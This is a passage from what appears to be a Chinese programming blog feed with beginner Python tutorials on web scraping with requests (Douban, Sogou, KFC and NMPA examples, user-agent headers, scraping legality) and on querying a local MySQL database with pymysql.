class="hljs-string">&quot;interval_id&quot;</span>: <span class="hljs-string">&quot;100:90&quot;</span>,<br>    <span class="hljs-string">&quot;action&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-string">&quot;start&quot;</span>:<span class="hljs-string">&quot;0&quot;</span> ,  <span class="hljs-comment"># 该网站 start表示从第几条数据开始</span><br>    <span class="hljs-string">&quot;limit&quot;</span>: <span class="hljs-string">&quot;10&quot;</span>   <span class="hljs-comment"># 读取几条数据</span><br>&#125;<br>data_html = requests.get(url=url,headers=head,params=param)     <span class="hljs-comment"># 发起请求</span><br><br><span class="hljs-comment"># 获取响应数据</span><br>html_text = data_html.json() <span class="hljs-comment"># json()可以将获取到的json格式的字符串进行反序列化</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">通过对数据分析，我们得到评分数据以字典的方式存储，每一个电影都以一个object存储</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># 将数据保存到本地</span><br>file = <span class="hljs-built_in">open</span>(file=<span class="hljs-string">&#x27;电影排名.txt&#x27;</span>,mode=<span class="hljs-string">&#x27;w&#x27;</span>,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><span class="hljs-keyword">for</span> dic <span class="hljs-keyword">in</span> html_text:<br>    types = dic[<span class="hljs-string">&#x27;types&#x27;</span>]<br>    title = dic[<span class="hljs-string">&#x27;title&#x27;</span>]<br>    score = dic[<span class="hljs-string">&#x27;score&#x27;</span>]<br>    release_date = dic[<span class="hljs-string">&#x27;release_date&#x27;</span>]<br>    file.write(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;types&#125;</span>:<span class="hljs-subst">&#123;title&#125;</span>:<span class="hljs-subst">&#123;score&#125;</span>-上映时间：<span class="hljs-subst">&#123;release_date&#125;</span>&quot;</span>+<span class="hljs-string">&quot;\n&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;title&#125;</span>保存成功~~&quot;</span>)<br>file.close()<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python---连接数据库</title>
    <link href="/2020/10/21/python---%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    <url>/2020/10/21/python---%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pymysql<br><span class="hljs-comment">#1.创建链接对象</span><br>conn = pymysql.Connect(<br>    host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-comment">#数据库服务器主机地址</span><br>    port=<span class="hljs-number">3306</span>, <span class="hljs-comment">#mysql的端口号</span><br>    user=<span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-comment">#数据库的用户名</span><br>    password=<span class="hljs-string">&#x27;boboadmin&#x27;</span>, <span class="hljs-comment">#数据库密码</span><br>    db=<span class="hljs-string">&#x27;AnHui&#x27;</span>,<span class="hljs-comment">#数据仓库的名称</span><br>    charset=<span class="hljs-string">&#x27;utf8&#x27;</span>)<br><span class="hljs-comment">#创建一个游标对象</span><br>cusor = conn.cursor()<br><span class="hljs-comment">#2.增加记录操作</span><br><span class="hljs-comment"># sql = &#x27;insert into emp(name,sex,age,dep_id)values(&quot;%s&quot;,&quot;%s&quot;,%d,%d)&#x27;%(&#x27;haha&#x27;,&#x27;female&#x27;,20,200)</span><br><span class="hljs-comment"># cusor.execute(sql)</span><br><span class="hljs-comment"># conn.commit() #对数据进行整改后，记得进行事物的提交</span><br><br><span class="hljs-comment">#3.删除记录</span><br><span class="hljs-comment"># sql = &#x27;delete from emp where name = &quot;%s&quot;&#x27;%&#x27;haha&#x27;</span><br><span class="hljs-comment"># print(sql)</span><br><span class="hljs-comment"># cusor.execute(sql)</span><br><span class="hljs-comment"># conn.commit()</span><br><br><span class="hljs-comment">#4.修改操作</span><br><span class="hljs-comment"># new_age = input(&#x27;enter a new age:&#x27;)</span><br><span class="hljs-comment"># new_age = int(new_age)</span><br><span class="hljs-comment"># sql = &#x27;update emp set age = %d where id = 3&#x27;%new_age</span><br><span class="hljs-comment"># print(sql)</span><br><span class="hljs-comment"># cusor.execute(sql)</span><br><span class="hljs-comment"># conn.commit()</span><br><br><span class="hljs-comment">#查询操作</span><br>sql = <span class="hljs-string">&#x27;select * from emp where age &gt; 30&#x27;</span><br>cusor.execute(sql) <span class="hljs-comment">#负责执行sql语句</span><br><span class="hljs-comment">#fetchall返回的是一个元组，元组元素又为一个元素，该元组中存储的是查询到的一条记录</span><br><span class="hljs-comment"># all_data = cusor.fetchall() #获取查询到所有的数据，如果没有查询到数据返回一个空元组</span><br><span class="hljs-comment"># print(all_data)</span><br><br><span class="hljs-comment">#fetchone只会返回查询到的第一条数据</span><br>one_data = cusor.fetchone() <span class="hljs-comment">#如果没有查询到数据返回None</span><br><span class="hljs-built_in">print</span>(one_data)<br><br><span class="hljs-comment">#关闭打开的资源对象</span><br>cusor.close()<br>conn.close()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python---requests</title>
    <link href="/2020/10/20/python---requests/"/>
    <url>/2020/10/20/python---requests/</url>
    
    <content type="html"><![CDATA[<h4 id="爬虫相关介绍"><a href="#爬虫相关介绍" class="headerlink" title="爬虫相关介绍"></a>爬虫相关介绍</h4><ul><li>什么是爬虫 <ul><li>就是编写程序，模拟浏览器上网，让其去互联网中抓取数据的过程 <ul><li>模拟： <ul><li>浏览器本身就是一个纯天然的爬虫工具，爬虫相关的模块都是基于浏览器为基础开发出来的。</li><li>注意：日后只要是你的爬虫程序没有爬取到你想要的数据，只有一个原因： <ul><li>就是你的爬虫程序模拟的力度不够！</li></ul></li></ul></li><li>抓取： <ul><li>抓取网页数据分两种情况： <ul><li>将一个页面所有的数据抓取到</li><li>将页面中局部的数据抓取到</li></ul></li></ul></li></ul></li></ul></li><li>爬虫在应用场景的分类 <ul><li>通用爬虫： <ul><li>将一个页面中所有的数据获取。</li><li>大部分的搜索引擎中应用比较多。</li></ul></li><li>聚焦爬虫 <ul><li>将页面中局部的指定的数据进行提取&#x2F;抓取</li><li>注意：聚焦爬虫一定是建立在通用爬虫的基础之上实现。</li></ul></li><li>功能爬虫 <ul><li>通过浏览器或者app自动化的操作，实现相关的网页或者app自动化的操作。代替人工在网页或者手机软件中自动执行相关的行为动作。</li><li>批量点赞，批量评论，刷单,秒杀…..</li></ul></li><li>增量式爬虫 <ul><li>用来监测网站数据更新的情况。以便爬取网站最新更新出来的数据！</li></ul></li><li>分布式爬虫 <ul><li>可以对网站所有的资源使用分布式机群进行分布和联合的数据爬取</li></ul></li></ul></li><li>爬虫的矛与盾 <ul><li>反爬机制：对应门户网站，网站可以指定相关的机制阻止爬虫对其网站数据的采集</li><li>反反爬策略：对应爬虫程序，爬虫可以制定相关的策略将网站的反爬机制破解，从而爬取到指定的数据</li></ul></li><li>盗亦有道的君子协议robots <ul><li>Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除标准”（Robots ExclusionProtocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取.</li><li>注意，这个协议的存在更多的是需要网络爬虫去遵守，而起不到防止爬虫的功能。</li></ul></li></ul><p><a name="0b3cd8cb"></a></p><h4 id="爬虫合法性探究"><a href="#爬虫合法性探究" class="headerlink" title="爬虫合法性探究"></a>爬虫合法性探究</h4><ul><li>**爬虫作为一种计算机技术就决定了它的中立性，因此爬虫本身在法律上并不被禁止，但是利用爬虫技术获取数据这一行为是具有违法甚至是犯罪的风险的。**所谓具体问题具体分析，正如水果刀本身在法律上并不被禁止使用，但是用来捅人，就不被法律所容忍了。</li><li>或者我们可以这么理解：爬虫是用来批量获得网页上的公开信息的，也就是前端显示的数据信息。因此，既然本身就是公开信息，其实就像浏览器一样，浏览器解析并显示了页面内容，爬虫也是一样，只不过爬虫会批量下载而已，所以是合法的。不合法的情况就是配合爬虫，利用黑客技术攻击网站后台，窃取后台数据（比如用户数据等）。</li><li>举个例子：像谷歌这样的搜索引擎爬虫，每隔几天对全网的网页扫一遍，供大家查阅，各个被扫的网站大都很开心。这种就被定义为“善意爬虫”。但是像抢票软件这样的爬虫，对着 12306 每秒钟恨不得撸几万次，铁总并不觉得很开心，这种就被定义为“恶意爬虫”。</li><li><strong>爬虫所带来风险主要体现在以下3个方面：</strong> <ul><li>1、违反网站意愿，例如网站采取反爬措施后，强行突破其反爬措施；</li><li>2、爬虫干扰了被访问网站的正常运营；</li><li>3、爬虫抓取了受到法律保护的特定类型的数据或信息。</li></ul></li><li><strong>那么作为爬虫开发者，如何在使用爬虫时避免进局子的厄运呢？</strong> <ul><li>1、严格遵守网站设置的robots协议；</li><li>2、在规避反爬虫措施的同时，需要优化自己的代码，避免干扰被访问网站的正常运行；</li><li>3、在使用、传播抓取到的信息时，应审查所抓取的内容，如发现属于用户的个人信息、隐私或者他人的商业秘密的，应及时停止并删除。</li></ul></li><li>总结： <ul><li>可以说在我们身边的网络上已经密密麻麻爬满了各种网络爬虫，它们善恶不同，各怀心思。而越是每个人切身利益所在的地方，就越是爬满了爬虫。**所以爬虫是趋利的，它们永远会向有利益的地方爬行。**技术本身是无罪的，问题往往出在人无限的欲望上。因此爬虫开发者的道德自持和企业经营者的良知才是避免触碰法律底线的根本所在。</li></ul></li></ul><p><a name="5897850e"></a></p><h4 id="requests基础操作"><a href="#requests基础操作" class="headerlink" title="requests基础操作"></a>requests基础操作</h4><ul><li>基本介绍 <ul><li>requests就是爬虫中一个基于网络请求的模块。</li><li>作用：模拟浏览器上网的。</li><li>urllib模块就是一个老版的requests模块，现在没人用urllib</li></ul></li><li>环境安装 <ul><li>pip install requests</li></ul></li><li>编码流程 <ul><li>指定url（好比打开浏览器输入网址）</li><li>发起请求（好比是按下回车）</li><li>获取响应数据（从指定url中爬取到的数据）</li><li>持久化存储</li></ul></li><li>案例应用 <ul><li><h2 id="搜狗首页数据采集-https-www-sogou-com"><a href="#搜狗首页数据采集-https-www-sogou-com" class="headerlink" title="搜狗首页数据采集 -  https://www.sogou.com/ "></a>搜狗首页数据采集<br> -  <a href="https://www.sogou.com/">https://www.sogou.com/</a> </h2></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment">#1,指定url</span><br>url = <span class="hljs-string">&#x27;https://www.sogou.com/&#x27;</span><br><br><span class="hljs-comment">#2,发起请求（只要在浏览器地址栏输入网址按下回车，发起的一定get请求）</span><br><span class="hljs-comment">#url为get方法的第一个参数，表示根据指定的url发起get请求</span><br><span class="hljs-comment">#get方法会返回一个响应对象</span><br>response = requests.get(url=url) <span class="hljs-comment">#get使用来使用requests模块发起get请求</span><br><br><span class="hljs-comment">#3.获取响应数据/爬取到的数据</span><br>page_text = response.text <span class="hljs-comment">#text属性使用来返回字符串形式的响应数据</span><br><span class="hljs-comment"># print(page_text)</span><br><br><span class="hljs-comment">#4.持久化存储</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./sogou.html&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> fp:<br>    fp.write(page_text)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;数据爬取存储成功！&#x27;</span>)<br></code></pre></td></tr></table></figure><ul><li>简易的网页采集器 <ul><li>注意：在浏览器的地址栏中网址，网址？后面的内容就是请求的参数（请求参数） <ul><li><a href="https://www.sogou.com/web?query=jay">https://www.sogou.com/web?query=jay</a></li><li>query&#x3D;jay就是请求的参数 <ul><li>请求参数就是客户端发送给服务端的数据</li></ul></li></ul></li><li><a href="https://www.sogou.com/">https://www.sogou.com/</a></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment">#请求参数动态化</span><br>keyword = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入关键字:&#x27;</span>)<br><span class="hljs-comment">#稍后想要把该字典作为请求参数</span><br>pram = &#123;<br>    <span class="hljs-string">&#x27;query&#x27;</span>:keyword, <span class="hljs-comment">#只存在一个键值对（存在一组请求参数）</span><br>&#125;<br><span class="hljs-comment">#1.指定url</span><br>url = <span class="hljs-string">&#x27;https://www.sogou.com/web&#x27;</span> <span class="hljs-comment">#需要将请求参数去除</span><br><span class="hljs-comment">#2.发起请求</span><br><span class="hljs-comment">#params参数就是用来在请求时携带指定的请求参数</span><br>response = requests.get(url=url,params=pram)<br><br><span class="hljs-comment">#3.获取响应数据</span><br>page_text = response.text<br><br><span class="hljs-comment">#4.持久化存储</span><br>fileName = keyword + <span class="hljs-string">&#x27;.html&#x27;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(fileName,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> fp:<br>    fp.write(page_text)<br><br><br><span class="hljs-comment">#出问题：没有爬取到我们想要的数据？原因是因为遇到反爬机制</span><br></code></pre></td></tr></table></figure><pre><code class="hljs">  -  分析该网站的反爬机制：      - 从爬取到的内容中提取到了一个关键信息：网站检测到了异常的访问请求         - 异常的访问请求：通过程序发起的请求        - 正常访问请求：通过浏览器发起的请求     - 网站如何可以监测请求是不是通过浏览器发起的呢？         - 是通过请求的一个头信息：user-agent        - user-agent：请求载体的身份标识     - 破解方式（UA伪装）：伪装请求载体的身份标识         - 该反爬机制是一种最常见最通用的，也就是说绝大数网站都会携带该反爬机制，因此日后写爬虫程序，默认带上UA伪装操作。  -  </code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment">#请求参数动态化</span><br>keyword = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入关键字:&#x27;</span>)<br><span class="hljs-comment">#稍后想要把该字典作为请求参数</span><br>pram = &#123;<br>    <span class="hljs-string">&#x27;query&#x27;</span>:keyword, <span class="hljs-comment">#只存在一个键值对（存在一组请求参数）</span><br>&#125;<br><span class="hljs-comment">#1.指定url</span><br>url = <span class="hljs-string">&#x27;https://www.sogou.com/web&#x27;</span> <span class="hljs-comment">#需要将请求参数去除</span><br><span class="hljs-comment">#2.发起请求</span><br>head = &#123; <span class="hljs-comment">#存放需要伪装的头信息</span><br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&#x27;</span><br>&#125;<br><span class="hljs-comment">#通过headers参数进行了头信息的伪装</span><br>response = requests.get(url=url,params=pram,headers=head)<br><br><span class="hljs-comment">#3.获取响应数据</span><br>page_text = response.text<br><br><span class="hljs-comment">#4.持久化存储</span><br>fileName = keyword + <span class="hljs-string">&#x27;.html&#x27;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(fileName,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> fp:<br>    fp.write(page_text)<br></code></pre></td></tr></table></figure><ul><li>豆瓣电影 <ul><li><a href="https://movie.douban.com/typerank?type_name=%E7%88%B1%E6%83%85&type=13&interval_id=100:90&action=">https://movie.douban.com/typerank?type_name&#x3D;爱情&amp;type&#x3D;13&amp;interval_id&#x3D;100:90&amp;action&#x3D;</a> <ul><li>爬取电影的详情数据 </li><li>对网站进行分析： <ul><li>1.在抓包工具中先定位到和浏览器地址栏的网址一样的数据包 </li><li>2.查看开发者工具中，定位到的数据包中的response这一项，该项中存放的就是对定位到数据包的url发起请求，请求到的数据。 </li><li>3.在response选项卡中查看是否存在我们想要爬取的数据： <ul><li>如何检测是否存在我们想要爬取的数据呢？ <ul><li>局部搜索：将你想要爬取的局部数据，在response进行搜索，查看是否可以搜索到。 <ul><li>搜索到了： <ul><li>可以直接对该数据包的url发起请求获取你想要的数据即可</li></ul></li><li>搜索不到： <ul><li>说明你想要的数据是【动态加载数据】</li><li>什么是动态加载数据？</li></ul></li></ul></li></ul></li></ul></li></ul></li></ul></li></ul></li><li>特指，不是通过浏览器地址栏的请求请求到的数据，就是动态加载数据。同理，动态加载数据一定是通过其他的请求请求到的。<br> - 如何获取动态加载数据？ </li><li>基于抓包工具进行全局搜索 </li><li>鼠标点击任意的数据包，然后按下cotrl+f打开全局搜索框，搜索局部你想要的数据，即可定位到包含搜索数据的指定数据包。 </li><li>从指定数据包中就可以提取出： </li><li>url：<a href="https://movie.douban.com/j/chart/top_list">https://movie.douban.com/j/chart/top_list</a></li><li>请求方式：get</li><li>请求参数：type&#x3D;13&amp;interval_id&#x3D;100%3A90&amp;action&#x3D;&amp;start&#x3D;0&amp;limit&#x3D;1<br> -</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>head = &#123; <span class="hljs-comment">#存放需要伪装的头信息</span><br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&#x27;</span><br>&#125;<br>pram = &#123;<br>    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;13&quot;</span>,<br>    <span class="hljs-string">&quot;interval_id&quot;</span>: <span class="hljs-string">&quot;100:90&quot;</span>,<br>    <span class="hljs-string">&quot;action&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-string">&quot;start&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>,<br>    <span class="hljs-string">&quot;limit&quot;</span>: <span class="hljs-string">&quot;20&quot;</span>,<br>&#125;<br>url = <span class="hljs-string">&#x27;https://movie.douban.com/j/chart/top_list&#x27;</span><br>response = requests.get(url=url,headers=head,params=pram)<br><span class="hljs-comment">#获取响应数据</span><br><span class="hljs-comment">#json()可以将获取到的json格式的字符串进行反序列化</span><br>page_text = response.json()<br>fp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./douban.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">for</span> dic <span class="hljs-keyword">in</span> page_text:<br>    title = dic[<span class="hljs-string">&#x27;title&#x27;</span>]<br>    score = dic[<span class="hljs-string">&#x27;score&#x27;</span>]<br>    fp.write(title+<span class="hljs-string">&#x27;:&#x27;</span>+score+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(title,<span class="hljs-string">&#x27;爬虫保存成功！&#x27;</span>)<br></code></pre></td></tr></table></figure><ul><li>肯德基 <ul><li><h2 id="http-www-kfc-com-cn-kfccda-index-aspx-将餐厅的位置信息进行数据爬取"><a href="#http-www-kfc-com-cn-kfccda-index-aspx-将餐厅的位置信息进行数据爬取" class="headerlink" title="http://www.kfc.com.cn/kfccda/index.aspx -  将餐厅的位置信息进行数据爬取 "></a><a href="http://www.kfc.com.cn/kfccda/index.aspx">http://www.kfc.com.cn/kfccda/index.aspx</a><br> -  将餐厅的位置信息进行数据爬取 </h2></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>head = &#123; <span class="hljs-comment">#存放需要伪装的头信息</span><br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&#x27;</span><br>&#125;<br><span class="hljs-comment">#post请求的请求参数</span><br>data = &#123;<br>    <span class="hljs-string">&quot;cname&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-string">&quot;pid&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-string">&quot;keyword&quot;</span>: <span class="hljs-string">&quot;天津&quot;</span>,<br>    <span class="hljs-string">&quot;pageIndex&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>    <span class="hljs-string">&quot;pageSize&quot;</span>: <span class="hljs-string">&quot;10&quot;</span>,<br>&#125;<br><span class="hljs-comment">#在抓包工具中：Form Data存放的是post请求的请求参数，而Query String中存放的是get请求的请求参数</span><br>url = <span class="hljs-string">&#x27;http://www.kfc.com.cn/kfccda/ashx/GetStoreList.ashx?op=keyword&#x27;</span><br><span class="hljs-comment">#在post请求中，处理请求参数的是data这个参数不是params</span><br>response = requests.post(url=url,headers=head,data=data)<br><span class="hljs-comment">#将响应数据进行反序列化</span><br>page_text = response.json()<br><span class="hljs-keyword">for</span> dic <span class="hljs-keyword">in</span> page_text[<span class="hljs-string">&#x27;Table1&#x27;</span>]:<br>    name = dic[<span class="hljs-string">&#x27;storeName&#x27;</span>]<br>    addr = dic[<span class="hljs-string">&#x27;addressDetail&#x27;</span>]<br>    <span class="hljs-built_in">print</span>(name,addr)<br></code></pre></td></tr></table></figure><ul><li>药监总局(作业) <ul><li><a href="http://scxk.nmpa.gov.cn:81/xk/">http://scxk.nmpa.gov.cn:81/xk/</a> </li><li>要求：抓取每一家企业的企业详情数据 </li><li>思路： <ul><li>1.在对一个陌生的网站进行数据爬取前，首先要确定我们想要爬取的数据是否为动态加载数据？ <ul><li>先进入到任意一家企业的详情页中，查看企业的详情数据是否为动态加载数据？ <ul><li>基于抓包工具进行局部搜索 <ul><li>搜索的到：不是动态加载</li><li>搜索不到：是动态加载 <ul><li>发现企业的详情数据是动态加载数据</li></ul></li></ul></li></ul></li><li>如何捕获动态加载数据？ <ul><li><h2 id="基于抓包工具进行全局搜索，定位到动态加载数据对应的数据包-url：http-scxk-nmpa-gov-cn-81-xk-itownet-portalAction-do-method-getXkzsById-请求方式：POST-请求参数：id-d601af664b5940029601d6d0a05be321-成功获取了一家企业对应的企业详情数据"><a href="#基于抓包工具进行全局搜索，定位到动态加载数据对应的数据包-url：http-scxk-nmpa-gov-cn-81-xk-itownet-portalAction-do-method-getXkzsById-请求方式：POST-请求参数：id-d601af664b5940029601d6d0a05be321-成功获取了一家企业对应的企业详情数据" class="headerlink" title="基于抓包工具进行全局搜索，定位到动态加载数据对应的数据包 -  url：http://scxk.nmpa.gov.cn:81/xk/itownet/portalAction.do?method=getXkzsById -  请求方式：POST -  请求参数：id: d601af664b5940029601d6d0a05be321 -  成功获取了一家企业对应的企业详情数据 "></a>基于抓包工具进行全局搜索，定位到动态加载数据对应的数据包<br> -  url：<a href="http://scxk.nmpa.gov.cn:81/xk/itownet/portalAction.do?method=getXkzsById">http://scxk.nmpa.gov.cn:81/xk/itownet/portalAction.do?method=getXkzsById</a><br> -  请求方式：POST<br> -  请求参数：id: d601af664b5940029601d6d0a05be321<br> -  成功获取了一家企业对应的企业详情数据 </h2></li></ul></li></ul></li></ul></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-comment">#指定url</span><br>url = <span class="hljs-string">&#x27;http://scxk.nmpa.gov.cn:81/xk/itownet/portalAction.do?method=getXkzsById&#x27;</span><br><span class="hljs-comment">#请求参数</span><br>data = &#123;<br>    <span class="hljs-string">&#x27;id&#x27;</span>:<span class="hljs-string">&#x27;d601af664b5940029601d6d0a05be321&#x27;</span><br>&#125;<br><span class="hljs-comment">#UA伪装</span><br>headers = &#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36X-Requested-With: XMLHttpRequest&#x27;</span><br>&#125;<br><span class="hljs-comment">#发起的post请求</span><br>response = requests.post(url=url,data=data,headers=headers)<br><span class="hljs-comment">#获取响应数据</span><br>json_data = response.json() <span class="hljs-comment">#如果确定响应数据为json格式字符串才可以调用json方法实现反序列化</span><br><span class="hljs-comment">#获取企业名称，法人代表，许可证编号</span><br><span class="hljs-built_in">print</span>(json_data[<span class="hljs-string">&#x27;epsName&#x27;</span>],json_data[<span class="hljs-string">&#x27;legalPerson&#x27;</span>],json_data[<span class="hljs-string">&#x27;productSn&#x27;</span>])<br></code></pre></td></tr></table></figure><pre><code class="hljs">              -  再次对另一家企业的企业详情数据进行分析                  - 定位到了动态加载数据对应的数据包                     - 在该数据包中可以提取到url，请求方式和请求参数，对比发现，不同企业的详情数据的数据包请方式和url是一样的，只有请求参数id的值不一样。                    - 结论：不同企业的企业详情数据对应的数据包只有id的参数不同剩下都一样。                    - 结果：如果我们可以批量获取多家企业的id值，就可以批量获取多家企业的企业详情数据。              -  如何批量获取多家企业的id值？                  -  id通常表示一组数据的唯一标识。联想到企业的名称也会作为企业的唯一标识，那么会不会企业的id和企业的名称在页面中是绑定在一起的呢？                     -  测试：在首页通过企业名称找到企业的id </code></pre><ul><li>通过抓包工具的分析，首页中企业的名称等信息也是动态加载数据。 </li><li>捕获动态加载数据。定位到指定的数据包，从数据包的响应数据中发现了不同企业的id，就可以将不同企业的id取到。 </li><li></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 